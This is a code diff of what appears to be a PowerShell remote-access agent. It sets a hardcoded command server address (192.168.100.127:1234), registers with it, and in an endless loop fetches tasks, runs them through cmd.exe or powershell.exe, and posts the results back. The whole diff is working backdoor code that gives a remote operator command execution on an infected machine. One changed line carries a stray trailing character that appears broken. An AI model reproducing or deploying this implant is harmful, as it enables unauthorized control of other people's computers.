@@ -1,5 +1,5 @@
-$ip   = "REPLACE_IP"
-$port = "REPLACE_PORT"
+$ip   = "192.168.100.127"
+$port = "1234"
 $n    = 3
 $name = ""
 
@@ -13,7 +13,7 @@ $data  = @{
     remote_ip = "$remote_ip"
     }
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
+$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")1
 
 for (;;){
 
@@ -30,18 +30,32 @@ for (;;){
             $args    = $task[2..$task.Length]
 
             if ($command -eq "shell"){
-     		$res = & cmd.exe /c $args | Out-String
+
+                $f    = "cmd.exe"
+                $arg  = "/c "
+
+                foreach ($a in $args){ $arg += $a + " " }
+
+                $res  = shell $f $arg
                 $data = @{result = "$res"}
 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+
             }
-            if ($command -eq "powershell"){
-     		$res = & powershell.exe /c $args | Out-String
+            elseif ($command -eq "powershell"){
+
+                $f    = "powershell.exe"
+                $arg  = "/c "
+
+                foreach ($a in $args){ $arg += $a + " " }
+
+                $res  = shell $f $arg
                 $data = @{result = "$res"}
 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
+
             }
-	    }
+        }
 
     sleep $n
     }
